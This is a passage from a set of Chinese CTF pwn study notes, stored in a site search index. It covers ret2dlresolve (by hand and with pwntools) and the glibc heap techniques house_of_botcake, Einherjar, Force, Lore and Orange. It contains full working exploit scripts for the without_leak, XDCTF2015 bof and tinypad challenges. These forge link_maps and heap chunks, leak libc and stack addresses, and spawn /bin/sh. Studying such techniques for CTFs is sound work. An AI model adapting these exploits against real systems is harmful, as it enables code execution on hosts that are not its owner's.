l_flags_1; Elf64_Word l_flags; int l_idx; struct link_map_machine l_mach; struct { const Elf64_Sym *sym; int type_class; struct link_map *value; const Elf64_Sym *ret; } l_lookup_cache; void *l_tls_initimage; size_t l_tls_initimage_size; size_t l_tls_blocksize; size_t l_tls_align; size_t l_tls_firstbyte_offset; ptrdiff_t l_tls_offset; size_t l_tls_modid; size_t l_tls_dtor_count; Elf64_Addr l_relro_addr; size_t l_relro_size; unsigned long long l_serial; struct auditstate l_audit[]; } 64位下伪造时（bss段离.dynsym的地址太远）由于 reloc->r_info也很大，最后使得访问ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;时程序访存出错，导致程序崩溃。_dl_fixup中的源码: if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0) { const struct r_found_version *version = NULL; if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL) { const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff; version = &l->l_versions[ndx]; if (version->hash == 0) version = NULL; } 所以在伪造时我们选择使得__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0这行判断不成立，进入else语句， 直接将l->l_addr + sym->st_value赋值给value，这使得我们需要伪造link_map。 _dl_fixup (struct link_map *l, ElfW(Word) reloc_arg) { //获取符号表地址 const ElfW(Sym) *const symtab= (const void *) D_PTR (l, l_info[DT_SYMTAB]); //获取字符串表地址 const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]); //获取函数对应的重定位表结构地址 const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); //获取函数对应的符号表结构地址 const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)]; //得到函数对应的got地址，即真实函数地址要填回的地址 void *const rel_addr = (void *)(l->l_addr + reloc->r_offset); DL_FIXUP_VALUE_TYPE value; //判断重定位表的类型，必须要为7--ELF_MACHINE_JMP_SLOT assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT); /* Look up the target symbol. If the normal lookup rules are not used don't look in the global scope. */ if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0) { ... } else { /* We already found the symbol. The module (and therefore its load address) is also known. */ value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value); result = l; } ... // 最后把value写入相应的GOT表条目rel_addr中 return elf_machine_fixup_plt (l, result, reloc, rel_addr, value); } 一般为了方便起见，一般直接控制reloc_index和reloc->r_info为0，把sym指向某一got-8的位置，这样sym->value就是libc中某一函数的地址，再控制l->l_addr为libc中system函数到该函数的偏移，这样l->l_addr + sym->st_value就变成了system函数的地址。 需要伪造的内容： l->l_addr l_info[5] (strtab相关) l_info[6] (symtab相关) l_info[23] (jmprel相关) Elf64_Rela结构 伪造的大致草图（可能只有我自己看的懂八，滑稽.jpg） 以hgame2021 week3 without_leak为例子 纯ret2dlruntime exp: from pwn import* context.log_level = 'debug' context.arch = 'amd64' p = process('./without_leak') #p = remote(\"182.92.108.71\",30483) elf = ELF('./without_leak') libc= ELF('/lib/x86_64-linux-gnu/libc.so.6') def build_fake_link_map(elf,fake_linkmap_addr,one_got,offset): target_addr = fake_linkmap_addr-8 #the result you write in linkmap = p64(offset & (2**64-1)) #l_addr linkmap = linkmap.ljust(0x68,'\\x00') linkmap += p64(fake_linkmap_addr) #l_info[5] dynstr linkmap += p64(fake_linkmap_addr+0x100) #l_info[6] dynsym linkmap = linkmap.ljust(0xf8,'\\x00') linkmap += p64(fake_linkmap_addr+0x110) #l_info[23] jmprel linkmap += p64(0)+p64(one_got-8) #dynmic symtab linkmap += p64(0)+p64(fake_linkmap_addr+0x120) #dynmic jmprel linkmap += p64(target_addr-offset)+p64(7)+p64(0) #fake_jmprel return linkmap plt0 = elf.get_section_by_name('.plt').header.sh_addr fake_link_map_addr = 0x00404000 +0x500 fake_link_map = build_fake_link_map(elf,fake_link_map_addr,elf.got['read'],libc.sym['system']-libc.sym['read']) sh_addr = fake_link_map_addr + len(fake_link_map) prdi = 0x401243 prsi_r15 = 0x401241 payload = 0x28*'\\x00'+p64(prdi)+p64(0)+p64(prsi_r15)+p64(fake_link_map_addr)+p64(0)+p64(elf.plt['read']) payload += p64(0x40119A)+p64(prdi) + p64(sh_addr) + p64(plt0+6)+p64(fake_link_map_addr)+p64(0) payload = payload.ljust(0x200,'\\x00') #gdb.attach(p,'b *0x401199\\nc\\nb _dl_fixup\\nc') p.sendafter('> \\n',payload) payload = fake_link_map+'/bin/sh\\x00' p.send(payload) p.interactive() linkmap布局 linkmap: 0x00: l_addr (offset from libc_address to target address . 0x68: P_DT_STRTAB = linkmap_addr(just a pointer) 0x70: p_DT_SYMTAB = fake_DT_SYMTAB = linkmap+0x100 . 0xF8: p_DT_JMPREL = fake_DT_JMPREL = linkmap+0x110 0x100: fake dynmic symtab #d_tag=0 0x108: #d_ptr=one_got-8 0x110: fake dynmic jmprel #d_tag=0 0x118: #d_ptr=linkmap+0x120 0x120: fake jmprel #r_offset= target-offset 0x128: #r_info=7 0x130: #r_append 这里拿到shell之后会稍微有点奇怪 一般出现Got EOF就是利用失败了，但是gdb调试发现程序确实执行了system，并且touch aaa确实会创建文件，并且exec 1>&0之后程序还是没有回显，本地不行，远程环境就可以。（待大佬指点） 感悟：真tm绕的不行，指针和宏定义都太多辣，但理解了也就那么回事情。 参考文档 https://ray-cp.github.io/archivers/ret2dl_resolve_analysis "},"pwn/rop/Ret2dlresolvePayload使用/Ret2dlresolvePayload使用.html":{"url":"pwn/rop/Ret2dlresolvePayload使用/Ret2dlresolvePayload使用.html","title":"Ret2dlresolvePayload使用","keywords":"","body":"对于Ret2dlresolve，payload构造特别麻烦，但pwntools有相应的工具，其payload构造可以由Ret2dlresolvePayload来完成。（真香） help(pwnlib.rop.ret2dlresolve.Ret2dlresolvePayload) Help on class Ret2dlresolvePayload in module pwnlib.rop.ret2dlresolve: class Ret2dlresolvePayload(__builtin__.object) | Methods defined here: | | __init__(self, elf, symbol, args, data_addr=None) | | ---------------------------------------------------------------------- | Data descriptors defined here: | | __dict__ | dictionary for instance variables (if defined) | | __weakref__ | list of weak references to the object (if defined) elf：相应的文件 symbol：函数名称 args：函数参数 data_addr：该payload所在的地址(默认会会放在bss比较高的地址上) 常用方法（用之前要设置context.binary和elf） dlresolve = Ret2dlresolvePayload(elf,symbol=\"system\",args=[\"/bin/sh\"],data_addr=0x804ad00)#data_addr直接默认也行，它会自己找到一个合适的地址 漏洞程序源码 bof.c（32位） #include #include #include void vuln() { char buf[100]; setbuf(stdin, buf); read(0, buf, 256); } int main() { char buf[100] = \"Welcome to XDCTF2015~!\\n\"; setbuf(stdout, buf); write(1, buf, strlen(buf)); vuln(); return 0; } exp： from pwn import* context.log_level = 'debug' context.binary = elf = ELF(\"./bof\") rop = ROP(context.binary) dlresolve = Ret2dlresolvePayload(elf,symbol=\"system\",args=[\"/bin/sh\"]) p = process('./bof') base_stage = dlresolve.data_addr p3_ret = 0x08048649 #pop esi ; pop edi ; pop ebp ; ret pebp_ret = 0x0804864b #pop ebp ; ret leave_ret = 0x0804853a payload1 = 'a'*112+p32(elf.plt['read'])+p32(p3_ret)+p32(0)+p32(base_stage)+p32(0x200) payload1 += p32(0x08048370) + p32(dlresolve.reloc_index) + 'dead'+p32(dlresolve.real_args[0]) p.sendafter('!',payload1) pause() p.send(dlresolve.payload) p.interactive() 当然，pwntools对于rop也是有模块可以用的，一些gadgets它会自动去程序里找（真香）。 print(rop.dump())可以查看rop链内容 >>> from pwn import * >>> context.log_level = 'debug' >>> context.binary = elf = ELF(\"./bof\") [DEBUG] PLT 0x8048380 setbuf [DEBUG] PLT 0x8048390 read [DEBUG] PLT 0x80483a0 strlen [DEBUG] PLT 0x80483b0 __libc_start_main [DEBUG] PLT 0x80483c0 write [DEBUG] PLT 0x80483d0 __gmon_start__ [*] '/home/tty18pwn/Desktop/ret2dl/x2015/bof' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) >>> rop = ROP(context.binary) [*] Loaded 10 cached gadgets for './bof' >>> dlresolve = Ret2dlresolvePayload(elf,symbol=\"system\",args=[\"/bin/sh\"]) [DEBUG] Symtab: 0x80481cc [DEBUG] Strtab: 0x804826c [DEBUG] Versym: 0x80482d8 [DEBUG] Jmprel: 0x8048324 [DEBUG] ElfSym addr: 0x804ae0c [DEBUG] ElfRel addr: 0x804ae1c [DEBUG] Symbol name addr: 0x804ae00 [DEBUG] Version index addr: 0x8048860 [DEBUG] Data addr: 0x804ae00 >>> # pwntools will help us choose a proper addr ... rop.read(0,dlresolve.data_addr) >>> rop.ret2dlresolve(dlresolve) [DEBUG] PLT_INIT: 0x8048370 >>> print(rop.dump()) 0x0000: 0x8048390 read(0, 0x804ae00) 0x0004: 0x804864a pop edi; pop ebp; ret 0x0008: 0x0 arg0 0x000c: 0x804ae00 arg1 0x0010: 0x8048370 [plt_init] system(0x804ae24) 0x0014: 0x2af8 [dlresolve index] 0x0018: 'gaaa' 0x001c: 0x804ae24 arg0 所以exp可以进一步简化。 from pwn import * context.log_level = 'debug' context.binary = elf = ELF(\"./bof\") rop = ROP(context.binary) dlresolve = Ret2dlresolvePayload(elf,symbol=\"system\",args=[\"/bin/sh\"]) rop.read(0,dlresolve.data_addr) rop.ret2dlresolve(dlresolve) print(rop.dump()) raw_rop = rop.chain() io = process(\"./bof\") io.sendafter('\\n',flat([{112:raw}])) pause() io.send(dlresolve.payload) io.interactive() "},"pwn/heap_related/":{"url":"pwn/heap_related/","title":"heap_related","keywords":"","body":""},"pwn/heap_related/house_of_botcake/house_of_botcake.html":{"url":"pwn/heap_related/house_of_botcake/house_of_botcake.html","title":"house_of_botcake","keywords":"","body":"house_of_botcake——double free glibc2.27中对tcache double free的检查导致无法像glibc2.23那样对fastbin double free利用，对于要free的且大小在tcache范围内的会将该堆块对整个链表进行校验对比，如果一样就会结束程序。 static void _int_free (mstate av, mchunkptr p, int have_lock) { ···· tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don't 100% trust it (it also matches random payload data at a 1 in 2^ chance), so verify it's not an unlikely coincidence before aborting. */ if (__glibc_unlikely (e->key == tcache)) { tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next) if (tmp == e) malloc_printerr (\"free(): double free detected in tcache 2\"); /* If we get here, it was a coincidence. We've wasted a few cycles, but don't abort. */ } ···· } 示例代码（how2heap） 效果：堆块任意地址分配 主要步骤有以下几点 1.填充满tcache bin 2.malloc 两个chunk：prev和victim，并且free掉victim，victim（因为tcache bin满了）落入unsorted bin中，接着free prev，使得malloc_consolidate被调用，合并后的chunk落在unsorted bin中，且chunk地址为prev地址 3.通过malloc(）使得tcache bin有空位，并且通过free(victim)将victim放入tcache bin中（因为victim大小满足tcache bin的大小） 4.再次tmp=malloc(size)，其中size应该大于prev的大小+0x20，程序进入unsorted bin中寻找chunk，并将unsorted bin中的chunk 切片，并将切片剩余的chunk放在unsorted bin中。 5.malloc得到的tmp包含部分victim地址，通过tmp改写victim的fd指针，由于victim位于tcache bin中，修改了fd指针便实验了任意地址分配的能力。 #include #include #include #include int main() { setbuf(stdin, NULL); setbuf(stdout, NULL); intptr_t stack_var[4]; intptr_t *x[7]; for(int i=0; i 执行到第23行时 prev和a合并放入unsorted bin中 执行到第24行，malloc的内存是从tcache bin中取出的 执行完第26行，tcache bin成功被污染 参考文章 https://blog.csdn.net/qq_40712959/article/details/115209640 "},"pwn/heap_related/House_of_Einherjar/House_of_Einherjar.html":{"url":"pwn/heap_related/House_of_Einherjar/House_of_Einherjar.html","title":"House_of_Einherjar","keywords":"","body":"﻿## House of Einherjar 原理 free中后向合并的操作（unlink），如果我们可以同时控制一个 chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。 free时合并的操作 static void _int_free (mstate av, mchunkptr p, int have_lock) { ... /* consolidate backward */ if (!prev_inuse(p)) { prevsize = prev_size(p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); } ... } unlink #define unlink(AV, P, BK, FD) { \\ if (__builtin_expect (chunksize(P) != (next_chunk(P))->prev_size, 0)) \\ malloc_printerr (check_action, \"corrupted size vs. prev_size\", P, AV); \\ FD = P->fd; \\ BK = P->bk; \\ if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ else { \\ FD->bk = BK; \\ BK->fd = FD; \\ if (!in_smallbin_range (P->size) \\ && __builtin_expect (P->fd_nextsize != NULL, 0)) { \\ if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) \\ || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \"corrupted double-linked list (not small)\", \\ P, AV); \\ if (FD->fd_nextsize == NULL) { \\ if (P->fd_nextsize == P) \\ FD->fd_nextsize = FD->bk_nextsize = FD; \\ else { \\ FD->fd_nextsize = P->fd_nextsize; \\ FD->bk_nextsize = P->bk_nextsize; \\ P->fd_nextsize->bk_nextsize = FD; \\ P->bk_nextsize->fd_nextsize = FD; \\ } \\ } else { \\ P->fd_nextsize->bk_nextsize = P->bk_nextsize; \\ P->bk_nextsize->fd_nextsize = P->fd_nextsize; \\ } \\ } \\ } \\ } 演示程序1 合并放入unsorted bin #include #include #include int main(){ long long int *s0 = (long long int *)malloc(0x200); long long int *s1 = (long long int *)malloc(0x18); long long int *s2 = (long long int *)malloc(0xf0); long long int *s3 = (long long int *)malloc(0x20); s0[0] = 0; s0[1] = 0x81; s0[2] = (long long int)s0; s0[3] = (long long int)s0; s0[16] = 0x80; s1[2] = 0x220; s2[-1] = 0x100; free(s2); return 0; } free(s2)前各个堆上的伪造情况 结果s0（部分）,s1,s2合并放入unsorted bin中 演示程序2 合并融入top chunk（top chunk地址变成栈上地址，堆上也依然ok） 这里s1大小属于large bin范围也可以 #include #include #include int main(){ long long int stack_chunk[6]; long long int *s0 = (long long int *)malloc(0x100); long long int *s1 = (long long int *)malloc(0x200); s1[-2] = (long long int)&s1[-2]-(long long int)&stack_chunk; s1[-1] = 0x210; stack_chunk[0] = 0; stack_chunk[1] = s1[-2]; stack_chunk[2] = (long long int)&stack_chunk; stack_chunk[3] = (long long int)&stack_chunk; stack_chunk[4] = (long long int)&stack_chunk; stack_chunk[5] = (long long int)&stack_chunk; free(s1); malloc(0x100); return 0; } 这里对于stack_chunk->fd_nextsize和stack_chunk->bk_nextsize也进行了伪造，因为unlink了一个大堆块，不在small bin的大小之内了，有额外检查。 #define unlink(AV, P, BK, FD) { \\ ··························· \\ if (!in_smallbin_range (P->size) \\ && __builtin_expect (P->fd_nextsize != NULL, 0)) { \\ if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) \\ || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \"corrupted double-linked list (not small)\", \\ P, AV); \\ ·························· \\ } free前 free后 例题 https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad 只能申请4个堆块，但是有uaf信息泄露很方便。 这里仅记录构造过程中的问题把，大致思路就是利用house of einherjar把unsorted bin放到程序数据段上去，最后通过直接修改tinypad的几个指针来任意写。 问题主要就是把数据段地址放到unsorted bin上后malloc能够成功，这里要有两个地方的伪造 1.假如unsorted bin里放的还是堆附近地址的块，那确实很方便直接申请也不会出事，但是由于现在数据段和堆段地址相差比较大，但是malloc的时候有检查。这里假如size过大>av->system_mem（0x21000）就会crash，所以这里伪造成比较小的一个值。 Unsorted bin 检查目标 检查条件 报错信息 unsorted bin chunk 大小 chunksize_nomask (victim) \\ chunksize_nomask (victim) > av->system_mem malloc(): memory corruption if (__builtin_expect (victim->size size > av->system_mem, 0)) malloc_printerr (check_action, \"malloc(): memory corruption\", chunk2mem (victim), av); 2.unlink的时候的对大小的检查，由于上面我们修改了size，所以对下一个chunk的prev_size也需要伪造。 unlink 检查目标 检查条件 报错信息 size vs prev_size chunksize(P) != prev_size (next_chunk(P)) corrupted size vs. prev_size 最终选择的伪造(注意这里连向unsorted bin的双链也不能断) 最终exp from pwn import* #context.log_level = 'debug' context.update(arch='amd64',os='linux',timeout=1) p = process('./tinypad') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def pr(a,addr): log.success(a+'===>'+hex(addr)) def add(size, content='a'): p.recvuntil('(CMD)>>> ') p.sendline('a') p.recvuntil('(SIZE)>>> ') p.sendline(str(size)) p.recvuntil('(CONTENT)>>> ') p.sendline(content) def edit(idx, content): p.recvuntil('(CMD)>>> ') p.sendline('e') p.recvuntil('(INDEX)>>> ') p.sendline(str(idx)) p.recvuntil('(CONTENT)>>> ') p.sendline(content) p.recvuntil('Is it OK?\\n') p.sendline('Y') def delete(idx): p.recvuntil('(CMD)>>> ') p.sendline('d') p.recvuntil('(INDEX)>>> ') p.sendline(str(idx)) add(0x100) add(0x100) add(0x100) add(0x100) delete(3) delete(1) p.recvuntil('INDEX: 1') p.recvuntil('CONTENT: ') heapbase = u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00')) -0x220 p.recvuntil('INDEX: 3') p.recvuntil('CONTENT: ') libcbase = u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00')) - (0x7fe1dd553b78-0x7fe1dd18f000) environ = libc.sym['environ']+libcbase pr('heapbase',heapbase) pr('libcbase',libcbase) add(0x100) add(0x100) delete(4) delete(1) delete(2) delete(3) #================================empty now ================================= add(0x100,'a'*0x100) edit(1,'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+'\\x00'*0x20+p64(0x40)) delete(1) add(0x10) #1 add(0xf0) #2 add(0x10) #3 add(0x100,'a'*0x100) #4 delete(1) add(0x18,'a'*0x10+p64(heapbase+0x20-0x602070)) #1 delete(2) edit(4,'a'*0x30+p64(0)+p64(0x101)+p64(libcbase+(0x00007f36556adb78-0x00007f36552e9000))*2) add(0xf0,'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148)) p.recvuntil('INDEX: 1') p.recvuntil('CONTENT: ') stackleak= u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00')) target = stackleak + (0x7ffefd8d96e8-0x7ffefd8d97d8) pr('target',target) pr('stackleak',stackleak) edit(2,p64(target)) edit(1,p64(libcbase+0x45226)) p.recvuntil('(CMD)>>> ') p.sendline('Q') #gdb.attach(p) p.interactive() "},"pwn/heap_related/House_Of_Force/House_Of_Force.html":{"url":"pwn/heap_related/House_Of_Force/House_Of_Force.html","title":"House_Of_Force","keywords":"","body":"﻿## House Of Force 利用条件 ​ House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆 (heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下条件： 能够以溢出等方式控制到 top chunk 的 size 域 能够自由地控制堆分配尺寸的大小 ​ House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。 glibc对于top chunk的验证 // 获取当前的top chunk，并计算其对应的大小 victim = av->top; size = chunksize(victim); // 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。 if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); av->top = remainder; set_head(victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; } ​ 然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制 top chunk size 域的漏洞。 (unsigned long) (size) >= (unsigned long) (nb + MINSIZE) ​ 一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证。 remainder = chunk_at_offset(victim, nb); av->top = remainder; /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) ​ 之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。 与此同时，我们需要注意的是，topchunk 的 size 也会更新，其更新的方法如下 victim = av->top; size = chunksize(victim); remainder_size = size - nb; set_head(remainder, remainder_size | PREV_INUSE); ​ 所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。 演示程序1 申请到比之前更低的地址 #include #include int main() { long *ptr,*ptr2; ptr=malloc(0x10); ptr=(long *)(((long)ptr)+24); *ptr=-1; // 执行malloc(-0x1020)的结果 top_chunk地址 = 原top_chunk地址 + 申请大小 +0x10 top_chunk_addr = 0x602020 - 0x1020 + 0x10 = 0x601010 演示程序2 申请到比之前更高的地址 #include #include int main() { long *ptr,*ptr2; ptr=malloc(0x10); ptr=(long *)(((long)ptr)+24); *ptr=-1; malloc(0x7ffff77cfad0); malloc(0x10); } 运行malloc(0x7ffff77cfad0)后的结果 top_chunk地址 = 原top_chunk地址 + 申请大小 +0x10 top_chunk_addr = 0x602020 + 0x7ffff77cfad0 + 0x10 =0x7ffff7dd1b00 "},"pwn/heap_related/House_of_lore/House_of_lore.html":{"url":"pwn/heap_related/House_of_lore/House_of_lore.html","title":"House_of_lore","keywords":"","body":"继续wiki搬运学习 https://wiki.x10sec.org/pwn/linux/glibc-heap/house_of_lore-zh/ House of Lore 概述 House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。 House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。 House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。 其实本质就是small bin双链表的伪造，注意检查机制就行 基本原理 如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下 /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range(nb)) { // 获取 small bin 的索引 idx = smallbin_index(nb); // 获取对应 small bin 中的 chunk 指针 bin = bin_at(av, idx); // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk // 如果 victim = bin ，那说明该 bin 为空。 // 如果不相等，那么会有两种情况 if ((victim = last(bin)) != bin) { // 第一种情况，small bin 还没有初始化。 if (victim == 0) /* initialization check */ // 执行初始化，将 fast bins 中的 chunk 进行合并 malloc_consolidate(av); // 第二种情况，small bin 中存在空闲的 chunk else { // 获取 small bin 中倒数第二个 chunk 。 bck = victim->bk; // 检查 bck->fd 是不是 victim，防止伪造 if (__glibc_unlikely(bck->fd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } // 设置 victim 对应的 inuse 位 set_inuse_bit_at_offset(victim, nb); // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来 bin->bk = bck; bck->fd = bin; // 如果不是 main_arena，设置对应的标志 if (av != &main_arena) set_non_main_arena(victim); // 细致的检查 check_malloced_chunk(av, victim, nb); // 将申请到的 chunk 转化为对应的 mem 状态 void *p = chunk2mem(victim); // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff alloc_perturb(p, bytes); return p; } } } 从下面的这部分我们可以看出 // 获取 small bin 中倒数第二个 chunk 。 bck = victim->bk; // 检查 bck->fd 是不是 victim，防止伪造 if (__glibc_unlikely(bck->fd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } // 设置 victim 对应的 inuse 位 set_inuse_bit_at_offset(victim, nb); // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来 bin->bk = bck; bck->fd = bin; 如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，并且同时满足之后的 bck->fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。 示例代码 #include #include #include #include #include int main(int argc, char * argv[]){ intptr_t* stack_buffer_1[4] = {0}; intptr_t* stack_buffer_2[4] = {0}; intptr_t *victim = malloc(0x100); malloc(0x10); free(victim); malloc(0x400); victim[1] = &stack_buffer_1; // victim_chunk_addr->bk = stack_buffer_1_addr stack_buffer_1[2] = victim-2; //stack_buffer_1->fd = victim_chunk_addr stack_buffer_1[3] = &stack_buffer_2; // stack_buffer_1->bk = stack_buffer_2_addr stack_buffer_2[2] = &stack_buffer_1;//stack_buffer_2->fd = stack_buffer_1_addr //===============================line================================= intptr_t *p1 = malloc(0x100); intptr_t *p2 = malloc(0x100);//chunk on the stack malloc(0x100); //failed : bck->fd != victim } 执行到line的时候的草图 最后一次malloc(0x100)会crash因为访问非法区域当然后面这个bck->fd != victim条件也不会满足 最终效果：申请到了栈上的堆块 "},"pwn/heap_related/House_of_Orange/House_of_Orange.html":{"url":"pwn/heap_related/House_of_Orange/House_of_Orange.html","title":"House_of_Orange","keywords":"","body":"House Of Orange 本质：Unsorted bin attack 和 FSOP造成的组合漏洞利用方式。 House of orange源于一道题目，有时候只用到free top chunk的题目也会被归入该类中。 glibc版本 特点：不需要free操作 核心原理： 1，获取unsorted bin 在_int_malloc函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来_int_malloc函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，则执行 sysmalloc 来向系统申请更多的空间。这时top_chunk会被放入unsorted bin中（ top chunk size 满足一定条件）。 由于top chunk size一般会很大，一般采用直接伪造其大小，具体伪造的原理参考wiki，https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/，这里这里只给出伪造的 top chunk size 的要求 伪造的 size 必须要对齐到内存页 size 要大于 MINSIZE(0x10) size 要小于之后申请的 chunk size + MINSIZE(0x10) size 的 prev inuse 位必须为 1 演示程序 #include #include #define fake_size 0x1fe1 int main(void) { void *ptr; int i; ptr=malloc(0x10); ptr=(void *)((int)ptr+24); *((long long*)ptr)=fake_size; malloc(0x2000); malloc(0x60); } fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size，这里选择了0x1fe1。 执行malloc(0x2000)之后的结果，成功使原先top chunk放入了unsorted bin 再次执行malloc(0x60)会从unsorted bin中切出。 并且此时堆地址和libc地址信息都被泄露了，看到有些博客说必须申请large bin大小的chunk才会出现堆泄露，但这里我声请一个小的chunk也可以实现泄露，暂时存疑。 2，Unsorted Bin Attack Unsorted Bin Attack的原理不再赘述，其结果是修改任意地址变成一个大数字（这里这个数字就是unsorted bin的地址）。这里这个被修改的是_IO_list_all指针，这里使他指向unsorted bin。 3，FSOP 这里_IO_list_all指向unsorted bin的地址。 演示代码 #include #include #include int winner ( char *ptr); int main() { char *p1, *p2; size_t io_list_all, *top; p1 = malloc(0x400-16); top = (size_t *) ( (char *) p1 + 0x400 - 16); top[1] = 0xc01; p2 = malloc(0x1000); io_list_all = top[2] + 0x9a8; //get real addr of io_list_all top[3] = io_list_all - 0x10; //unsorted bin->bk = io_list_all - 0x10 memcpy( ( char *) top, \"/bin/sh\\x00\", 8); //fake_file->_flags top[1] = 0x61; //fake_size FILE *fp = (FILE *) top; fp->_mode = 0; // top+0xc0 fp->_IO_write_base = (char *) 2; // top+0x20 fp->_IO_write_ptr = (char *) 3; // top+0x28 size_t *jump_table = &top[12]; // controlled memory jump_table[3] = (size_t) &winner; *(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table; // top+0xd8 malloc(10); return 0; } int winner(char *ptr) { system(ptr); return 0; } 执行malloc(10)前，对unsorted bin的伪造 注：这里fake_size为0x61是因为_chain在FILE结构体中偏移量是0x68 补充：GDB提供了格式化输出显示结构体的选项，set print pretty off， 这个选项的默认是关闭的。打开该选项set print pretty on再次打印结构体，结果如下：我TM直接就快乐了 执行malloc(10)后_IO_list_all指向了unsorted bin头节点的位置，此时smallbin[4]里放的就是我们之前魔改过的被放入unsorted bin的chunk了，并且正好偏移量0x60，这也就是为什么伪造fake_size为0x61。 malloc(10)的过程：伪造的unsorted bin脱链进入对应的small bin，并且通过unsorted bin attack使_IO_list_all指向了unsorted bin的头结点========>程序异常========>进行_IO_flush_all_lockp========>第一个FILE结构_mode异常未能触发_IO_OVERFLOW========>遍历到第二个FILE结构成功触发利用。 注：这里的触发具有一定概率，1/2的可能性，具体1/2如何得出尚待考证。这里给出angelboy的一张截图。 最后触发system(\"/bin/sh\")的流程 __libc_malloc => malloc_printerr => __libc_message => abort => _IO_flush_all_lockp 栈回溯 效果图：程序打印异常后成功getshell 例1 ciscn 2020 华东北分区赛 heap_stack 最经典的例题就是 hitcon-2016-houseoforange，但感觉那个稍微复杂一点，有一些别的东西参杂在里面，这道heap_stack相对来说作为例题来看更加清楚。 保护机制 main函数逻辑，思路比较清晰，没有free函数 void __fastcall main(__int64 a1, char **a2, char **a3) { init_clear(); puts(\"######## HEAPSTACK ########\"); while ( 1 ) { menu(); getNum(); switch ( choice ) { case 1u: push(); break; case 2u: puuuuuush(); break; case 3u: pop(); break; case 4u: show(); break; case 5u: exit(0); return; default: 